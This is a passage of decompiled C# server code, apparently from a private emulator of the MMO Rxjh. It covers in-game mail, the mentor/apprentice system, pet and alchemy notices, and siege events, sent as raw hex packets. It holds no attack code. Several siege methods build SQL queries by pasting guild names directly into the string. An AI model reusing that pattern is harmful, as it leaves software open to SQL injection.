						if (players != null)
						{
							个人传书类 个人传书类 = new 个人传书类();
							个人传书类.传书ID = (int)RxjhClass.GetDBItmeId();
							个人传书类.传书发送人 = base.UserName;
							个人传书类.传书内容 = 消息内容;
							个人传书类.传书时间 = DateTime.Now;
							个人传书类.是否NPC = 0;
							个人传书类.是否已读 = 0;
							players.传书列表.Add(个人传书类.传书ID, 个人传书类);
							players.查看传书();
							players.有新传书提示(消息类型, 数量);
						}
						byte[] array = Converter.hexStringToByte("AA551000010000B4000100000000000000005DA355AA");
						base.Client.Send(array, array.Length);
						RxjhClass.创建传书(base.UserName, 对方名字, 0, 消息内容, 消息类型);
					}
					else
					{
						系统提示("无法找到对方。");
					}
				}
			}
			catch
			{
			}
		}

		public void 阅读传书(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 10);
			try
			{
				if (传书列表 != null)
				{
					byte[] array = Converter.hexStringToByte("AA553F000000B600310000");
					byte[] array2 = Converter.hexStringToByte("000000000000000055AA");
					foreach (个人传书类 value in 传书列表.Values)
					{
						if (value.传书ID == num)
						{
							if (value.是否已读 == 0)
							{
								value.是否已读 = 1;
								RxjhClass.设置传书已读(num, 1);
								查看传书();
							}
							byte[] bytes = Encoding.Default.GetBytes(value.传书内容);
							byte[] array3 = new byte[array.Length + array2.Length + bytes.Length + 6];
							System.Buffer.BlockCopy(array, 0, array3, 0, array.Length);
							System.Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
							System.Buffer.BlockCopy(BitConverter.GetBytes(array3.Length - 6), 0, array3, 2, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length + 7), 0, array3, 8, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array3, 11, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(bytes.Length), 0, array3, 15, 2);
							System.Buffer.BlockCopy(bytes, 0, array3, 17, bytes.Length);
							base.Client.Send(array3, array3.Length);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "阅读传书()出错" + base.人物全服ID + "|  " + ex.Message);
			}
		}

		public void 师徒提示(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000B9004110120029000F0000000000000000000000000000000000000000001C8455AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 师徒系统(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				switch (封包数据[10])
				{
				case 2:
					if (师傅数据.TID != -1)
					{
						师徒提示(22, text);
					}
					else if (base.Player_Job_leve < 1)
					{
						师徒提示(12, text);
					}
					else
					{
						Players players2 = World.检查玩家name(text);
						if (players2 != null)
						{
							if (players2.师傅数据.TID != -1)
							{
								师徒提示(21, text);
							}
							else if (base.Player_Job == 8)
							{
								师徒提示(42, text);
							}
							else if (base.Player_Job == 9)
							{
								系统提示("谭花灵不能成为徒弟", 9, "    ");
							}
							else if (base.Player_Job == 10)
							{
								系统提示("格斗式不能成为徒弟", 9, "    ");
							}
							else
							{
								bool flag2 = false;
								for (int k = 0; k < 3; k++)
								{
									if (players2.徒弟数据[k].TID == -1)
									{
										flag2 = true;
										break;
									}
								}
								if (!flag2)
								{
									师徒提示(21, text);
								}
								else if (players2.Player_Job_leve < 2)
								{
									师徒提示(11, text);
								}
								else if (players2.Player_Level - base.Player_Level < 20)
								{
									师徒提示(13, text);
								}
								else if (base.Player_Zx != 0 && base.Player_Zx != players2.Player_Zx)
								{
									师徒提示(14, text);
								}
								else if (!查找范围玩家(40, players2))
								{
									师徒提示(15, text);
								}
								else
								{
									base.FLD_临时师徒 = text;
									players2.FLD_临时师徒 = base.UserName;
									师徒提示(513, text);
									players2.师徒提示(513, base.UserName);
								}
							}
						}
						else
						{
							师徒提示(41, text);
						}
					}
					break;
				case 1:
				{
					if (师傅数据.TID != -1)
					{
						师徒提示(21, text);
					}
					bool flag = false;
					for (int j = 0; j < 3; j++)
					{
						if (徒弟数据[j].TID == -1)
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						师徒提示(21, text);
					}
					else if (base.Player_Job_leve < 2)
					{
						师徒提示(11, text);
					}
					else
					{
						Players players = World.检查玩家name(text);
						if (players != null)
						{
							if (师傅数据.TID != -1)
							{
								师徒提示(22, text);
							}
							else if (players.Player_Job == 8)
							{
								师徒提示(42, text);
							}
							else if (players.Player_Job == 9)
							{
								系统提示("谭花灵不能成为徒弟", 9, "    ");
							}
							else if (players.Player_Job == 10)
							{
								系统提示("格斗式不能成为徒弟", 9, "    ");
							}
							else if (players.Player_Job_leve < 1)
							{
								师徒提示(12, text);
							}
							else if (base.Player_Level - players.Player_Level < 20)
							{
								师徒提示(13, text);
							}
							else if (players.Player_Zx != 0 && base.Player_Zx != players.Player_Zx)
							{
								师徒提示(14, text);
							}
							else if (!查找范围玩家(40, players))
							{
								师徒提示(15, text);
							}
							else
							{
								base.FLD_临时师徒 = text;
								players.FLD_临时师徒 = base.UserName;
								师徒提示(257, text);
								players.师徒提示(257, base.UserName);
							}
						}
						else
						{
							师徒提示(41, text);
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒系统  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 师徒系统请求(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				Players players = World.检查玩家name(base.FLD_临时师徒);
				if (players != null)
				{
					switch (num)
					{
					case 2:
						switch (num2)
						{
						case 2:
							base.FLD_临时师徒 = "";
							players.FLD_临时师徒 = "";
							师徒请求接受(514, "");
							players.师徒请求接受(514, base.UserName);
							break;
						case 1:
						{
							int num4 = -1;
							for (int j = 0; j < 3; j++)
							{
								if (players.徒弟数据[j].TID == -1)
								{
									num4 = j;
									break;
								}
							}
							if (num4 != -1 && RxjhClass.创建师徒关系(players.FLD_临时师徒, base.FLD_临时师徒, base.Player_Level, num4) == 1)
							{
								师傅数据.STNAME = base.FLD_临时师徒;
								师傅数据.STLEVEL = 5;
								师傅数据.TID = num4;
								师傅数据.STYHD = 0;
								师傅数据.TLEVEL = base.Player_Level;
								师傅数据.STWG1 = 0;
								师傅数据.STWG2 = 0;
								师傅数据.STWG3 = 0;
								players.徒弟数据[num4].TID = num4;
								players.徒弟数据[num4].STNAME = players.FLD_临时师徒;
								players.徒弟数据[num4].STLEVEL = 5;
								players.徒弟数据[num4].STYHD = 0;
								players.徒弟数据[num4].TLEVEL = base.Player_Level;
								players.徒弟数据[num4].STWG1 = 0;
								players.徒弟数据[num4].STWG2 = 0;
								players.徒弟数据[num4].STWG3 = 0;
								系统提示("拜师成功,您的师傅是  " + base.FLD_临时师徒 + "。CTRL+B  打开师徒界面。");
								players.师徒请求接受(258, players.FLD_临时师徒);
								徒弟更新师徒系统();
								players.师傅更新师徒系统(num4);
								base.FLD_临时师徒 = "";
								players.FLD_临时师徒 = "";
							}
							break;
						}
						}
						break;
					case 1:
						switch (num2)
						{
						case 2:
							base.FLD_临时师徒 = "";
							players.FLD_临时师徒 = "";
							师徒请求接受(513, "");
							players.师徒请求接受(513, base.UserName);
							break;
						case 1:
						{
							int num3 = -1;
							for (int i = 0; i < 3; i++)
							{
								if (徒弟数据[i].TID == -1)
								{
									num3 = i;
									break;
								}
							}
							if (num3 != -1 && RxjhClass.创建师徒关系(base.FLD_临时师徒, players.FLD_临时师徒, players.Player_Level, num3) == 1)
							{
								players.师傅数据.STNAME = players.FLD_临时师徒;
								players.师傅数据.STLEVEL = 5;
								players.师傅数据.TID = num3;
								players.师傅数据.STYHD = 0;
								players.师傅数据.TLEVEL = players.Player_Level;
								players.师傅数据.STWG1 = 0;
								players.师傅数据.STWG2 = 0;
								players.师傅数据.STWG3 = 0;
								徒弟数据[num3].TID = num3;
								徒弟数据[num3].STNAME = base.FLD_临时师徒;
								徒弟数据[num3].STLEVEL = 5;
								徒弟数据[num3].STYHD = 0;
								徒弟数据[num3].TLEVEL = players.Player_Level;
								徒弟数据[num3].STWG1 = 0;
								徒弟数据[num3].STWG2 = 0;
								徒弟数据[num3].STWG3 = 0;
								师徒请求接受(257, string.Empty);
								players.师徒请求接受(769, players.FLD_临时师徒);
								players.系统提示("拜师成功,您的师傅是" + players.FLD_临时师徒, 9, "恭喜");
								players.徒弟更新师徒系统();
								师傅更新师徒系统(num3);
								base.FLD_临时师徒 = "";
								players.FLD_临时师徒 = "";
							}
							break;
						}
						}
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒系统请求  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 师徒系统取消(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				int num2 = 封包数据[11];
				Players players = 得到人物数据(base.FLD_临时师徒);
				if (players != null)
				{
					switch (num)
					{
					case 2:
						if (num2 == 3)
						{
							取消师徒请求(770, base.FLD_临时师徒);
							players.取消师徒请求(769, base.FLD_临时师徒);
						}
						break;
					case 1:
						if (num2 == 3)
						{
							取消师徒请求(769, base.FLD_临时师徒);
							players.取消师徒请求(769, base.FLD_临时师徒);
						}
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒系统取消  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 师徒请求接受(int id, string 对方名字)
		{
			using (发包类 发包类 = new 发包类())
			{
				发包类.Write2(id);
				发包类.Write(15);
				发包类.WriteName(对方名字);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 17168, base.人物全服ID);
				}
			}
		}

		public void 取消师徒请求(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000FF034510120001020F0000000000000000000000000000000000000000008BA555AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			System.Buffer.BlockCopy(bytes, 0, array, 13, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 解除师徒关系请求(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000D5034710120001010F000000000000000000000000000000000000000000DBE955AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			System.Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 师徒系统解除(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				switch (num)
				{
				case 2:
					if (RxjhClass.解除师徒关系(base.UserName, text) == 1)
					{
						师傅数据.TID = -1;
						解除师徒关系请求(257, text);
						Players players2 = World.检查玩家name(text);
						if (players2 != null)
						{
							int num3 = 0;
							for (int k = 0; k < 3; k++)
							{
								if (players2.徒弟数据[k].STNAME == text)
								{
									num3 = k;
									break;
								}
							}
							players2.徒弟数据[num3].TID = -1;
							players2.解除师徒关系请求(257, base.UserName);
						}
					}
					break;
				case 1:
				{
					int num2 = 0;
					for (int j = 0; j < 3; j++)
					{
						if (徒弟数据[j].STNAME == text)
						{
							num2 = j;
							break;
						}
					}
					if (RxjhClass.解除师徒关系(text, base.UserName) == 1)
					{
						徒弟数据[num2].TID = -1;
						解除师徒关系请求(257, text);
						Players players = World.检查玩家name(text);
						if (players != null)
						{
							players.师傅数据.TID = -1;
							players.解除师徒关系请求(257, base.UserName);
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒系统解除  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 选取怪物封包(byte[] data, int lenght)
		{
			try
			{
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write4(BitConverter.ToInt32(data, 11));
					发包类.Write4(0);
					if (base.Client != null)
					{
						base.Client.SendPak(发包类, 35088, base.人物全服ID);
					}
				}
			}
			catch
			{
			}
		}

		public void 师徒武功检查(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && data[10 + i] != 0; i++)
				{
					array[i] = data[10 + i];
				}
				Players players = World.检查玩家name(Encoding.Default.GetString(array).Replace("\0", "").Trim());
				if (players != null)
				{
					byte[] array2 = Converter.hexStringToByte("AA550F00D5036110010003000000000000EC0F55AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(players.Player_Job), 0, array2, 10, 1);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
				else
				{
					byte[] array3 = Converter.hexStringToByte("AA550F00D5036110010003000000000000EC0F55AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job), 0, array3, 10, 1);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒武功检查  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 师徒传授武功(byte[] 封包数据, int length)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				byte[] array2 = new byte[4];
				int num = 封包数据[27];
				System.Buffer.BlockCopy(封包数据, 28, array2, 0, 4);
				int num2 = BitConverter.ToInt32(array2, 0);
				Players players = World.检查玩家name(text);
				武功类 value;
				if (players != null && World.TBL_KONGFU.TryGetValue(num2, out value))
				{
					if (players.Player_Job_leve < value.FLD_JOBLEVEL - 1)
					{
						string str = players.Player_Job_leve.ToString();
						string str2 = 1.ToString();
						系统提示("该徒弟只能传授最高(" + str + str2 + ")转的武功！", 9, "      ");
					}
					else
					{
						int num3 = -1;
						for (int j = 0; j < 3; j++)
						{
							if (徒弟数据[j].STNAME == text)
							{
								num3 = j;
								break;
							}
						}
						if (num3 != -1)
						{
							int fLD_AT = value.FLD_AT;
							int fLD_MP = value.FLD_MP;
							switch (players.师傅数据.STLEVEL)
							{
							case 4:
							case 5:
							{
								if (num == 1 || num == 2)
								{
									系统提示("4/5级师徒只能传授第一个武功！", 9, "      ");
									return;
								}
								int sTLEVEL = players.师傅数据.STLEVEL;
								break;
							}
							case 2:
							case 3:
								if (num == 2)
								{
									系统提示("3/4级师徒只能传授二个武功！", 9, "      ");
									return;
								}
								if (players.师傅数据.STLEVEL == 3)
								{
								}
								break;
							}
							switch (num)
							{
							default:
								徒弟数据[num3].STWG3 = num2;
								players.师傅数据.STWG3 = num2;
								break;
							case 1:
								徒弟数据[num3].STWG2 = num2;
								players.师傅数据.STWG2 = num2;
								break;
							case 0:
								徒弟数据[num3].STWG1 = num2;
								players.师傅数据.STWG1 = num2;
								break;
							}
							传授武功(num, num2);
							players.传授武功(num, num2);
							师傅更新师徒系统(num3);
							players.徒弟更新师徒系统();
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "师徒传授武功  出错" + base.Client.WorldId + "|" + base.Client.ToString() + "  " + ex.Message);
			}
		}

		public void 传授武功(int 位置, int 武功ID)
		{
			byte[] array = Converter.hexStringToByte("AA551B00D50349100D0001CBE204000000000000000000000000000000A15D55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 11, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 徒弟更新师徒系统()
		{
			if (师傅数据.STLEVEL > 0)
			{
				if (师傅数据.STLEVEL <= 3)
				{
					int num = 864000000;
					if (!追加状态列表.ContainsKey(900000451))
					{
						int 时间;
						状态效果(BitConverter.GetBytes(900000451), 1, 时间 = num + 3000);
						追加状态类 追加状态类 = new 追加状态类(this, 时间, 900000451, 1);
						追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
						addFLD_追加百分比_防御(0.05);
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
				if (师傅数据.STLEVEL <= 2)
				{
					int num2 = 86400000;
					if (!追加状态列表.ContainsKey(900000452))
					{
						int 时间2;
						状态效果(BitConverter.GetBytes(900000452), 1, 时间2 = num2 + 3000);
						追加状态类 追加状态类2 = new 追加状态类(this, 时间2, 900000452, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						addFLD_追加百分比_攻击(0.05);
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
				if (师傅数据.STLEVEL == 1)
				{
					int num3 = 86400000;
					if (!追加状态列表.ContainsKey(900000462))
					{
						int 时间3;
						状态效果(BitConverter.GetBytes(900000462), 1, 时间3 = num3 + 3000);
						追加状态类 追加状态类3 = new 追加状态类(this, 时间3, 900000462, 1);
						追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
						base.FLD_人物_武功防御力增加百分比 += 0.05;
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
			}
			try
			{
				byte[] array = Converter.hexStringToByte("AA554E00BF054A1048000FC5A00000D000000000000000000000020A0204E40D00A025260001000000000000000000000000323032303032313330300000000000000000000000000000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (师傅数据.STNAME != "")
				{
					byte[] bytes = Encoding.Default.GetBytes(师傅数据.STNAME);
					System.Buffer.BlockCopy(bytes, 0, array, 11, bytes.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STLEVEL), 0, array, 28, 1);
					System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.TLEVEL), 0, array, 27, 1);
					System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STYHD), 0, array, 30, 2);
					Players players = 得到人物数据(师傅数据.STNAME);
					if (players != null)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(players.Player_Level), 0, array, 27, 1);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 26, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.TLEVEL), 0, array, 27, 1);
					}
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG1), 0, array, 38, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG2), 0, array, 42, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG3), 0, array, 46, 4);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "徒弟更新师徒系统()出错" + base.人物全服ID + "|  " + ex.Message);
			}
		}

		public void 计算师徒属性(int index)
		{
			if (徒弟数据[index].STLEVEL <= 0)
			{
				return;
			}
			if (徒弟数据[index].STLEVEL <= 3)
			{
				int num = 864000000;
				if (!追加状态列表.ContainsKey(900000451))
				{
					int 时间;
					状态效果(BitConverter.GetBytes(900000451), 1, 时间 = num + 3000);
					追加状态类 追加状态类 = new 追加状态类(this, 时间, 900000451, 1);
					追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
				}
				addFLD_追加百分比_防御(0.05);
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
			if (徒弟数据[index].STLEVEL <= 2)
			{
				int num2 = 86400000;
				if (!追加状态列表.ContainsKey(900000452))
				{
					int 时间2;
					状态效果(BitConverter.GetBytes(900000452), 1, 时间2 = num2 + 3000);
					追加状态类 追加状态类2 = new 追加状态类(this, 时间2, 900000452, 1);
					追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
				}
				addFLD_追加百分比_攻击(0.05);
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
			if (徒弟数据[index].STLEVEL == 1)
			{
				int num3 = 86400000;
				if (!追加状态列表.ContainsKey(900000462))
				{
					int 时间3;
					状态效果(BitConverter.GetBytes(900000462), 1, 时间3 = num3 + 3000);
					追加状态类 追加状态类3 = new 追加状态类(this, 时间3, 900000462, 1);
					追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
				}
				base.FLD_人物_武功防御力增加百分比 += 0.05;
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
		}

		public void 师傅更新师徒系统(int index)
		{
			byte[] array = Converter.hexStringToByte("AA554E0077044B104800020F000000000000000000000000000000010A02D0E50D00A0252600000000000000000000000000323032303032313330300020202020202020202020202020202000202020202055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(徒弟数据[index].STNAME);
			System.Buffer.BlockCopy(bytes, 0, array, 12, bytes.Length);
			if (得到人物数据(徒弟数据[index].STNAME) != null)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 27, 1);
			}
			else
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 27, 1);
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STLEVEL), 0, array, 29, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].TLEVEL), 0, array, 28, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STYHD), 0, array, 31, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG1), 0, array, 38, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG2), 0, array, 42, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG3), 0, array, 46, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(index), 0, array, 10, 1);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 灵宠强化提示(int ID, int ID2)
		{
			byte[] array = Converter.hexStringToByte("AA551900E2007A0314000200C4090000000000000300460000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID2), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 12, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 灵宠合成提示(int ID, int ID2, int ID3, 物品类 物品, int 是否成功)
		{
			byte[] array = Converter.hexStringToByte("AA55C600E2015100B80073010100000000009ACE9A3B000000000E00000094CE9A3B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E8030000000000000000000000000000B82200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID2), 0, array, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
			System.Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
			System.Buffer.BlockCopy(物品.物品属性, 0, array, 38, World.物品属性大小);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 94, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes((long)ID3), 0, array, 98, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes((long)ID3), 0, array, 102, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(是否成功), 0, array, 110, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 炼金合成提示(int 操作ID, int ID, int ID2, 物品类 物品, int ID3)
		{
			byte[] array = Converter.hexStringToByte("AA55C600E2015100B80073010100000000009ACE9A3B000000000E00000094CE9A3B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E8030000000000000000000000000000B82200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID3), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
			System.Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
			System.Buffer.BlockCopy(物品.物品属性, 0, array, 38, World.物品属性大小);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 94, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes((long)ID2), 0, array, 98, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes((long)ID2), 0, array, 102, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 加载攻城数据()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT  *  FROM  攻城城主"), "GameServer");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count != 0)
			{
				World.攻城数据list.Clear();
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					攻城数据 攻城数据 = new 攻城数据
					{
						ID = (int)dBToDataTable.Rows[i]["帮派ID"],
						行会名字 = dBToDataTable.Rows[i]["攻城行会名"].ToString(),
						天魔攻城时间 = DateTime.Parse(dBToDataTable.Rows[i]["攻城时间"].ToString()),
						天魔攻城奖励时间 = DateTime.Parse(dBToDataTable.Rows[i]["攻城奖励时间"].ToString()),
						城主名字 = dBToDataTable.Rows[i]["城主名字"].ToString()
					};
					World.攻城数据list.Add(攻城数据.ID, 攻城数据);
				}
			}
			dBToDataTable.Dispose();
		}

		public void 发送天魔神宫邀请()
		{
			byte[] array = Converter.hexStringToByte("AA551C00280305510E000000000001000000020011A40000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送天魔神宫邀请银币()
		{
			byte[] array = Converter.hexStringToByte("AA5514006B0203510E0000000000FFFFFFFFFFFF0700000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 天魔神宫开始消息()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA552E000100400220001C0066000E4C035301600007000A00000001000120054002010807A008E03E00000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫正城门已开启()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA550B000000D40405002E4000000055AA");
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫东城门已开启()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA550B000000D40405002F4000000055AA");
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫雕像击杀()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [TBL_XWWL_Guild]  where  G_Name='{0}'", base.帮派名字));
			DBA.ExeSqlCommand(string.Format("INSERT  INTO  攻城城主  (城主名字,攻城行会名,帮派ID)values('{0}','{1}',{2})", dBToDataTable.Rows[0]["G_Master"].ToString(), base.帮派名字, base.帮派Id));
			dBToDataTable.Dispose();
		}

		public void 天魔神宫雕像击杀移动(Players 人物)
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
			string b = dBToDataTable.Rows[0]["攻城行会名"].ToString();
			if (人物.人物坐标_地图 == 42101)
			{
				if (人物.帮派名字 == b)
				{
					人物.天魔移动(-427f, -13f, 15f, 42101);
				}
				else
				{
					人物.天魔移动(-431f, -681f, 15f, 42101);
				}
			}
			dBToDataTable.Dispose();
		}

		public void 天魔神宫攻城胜利包(Players 人物)
		{
			try
			{
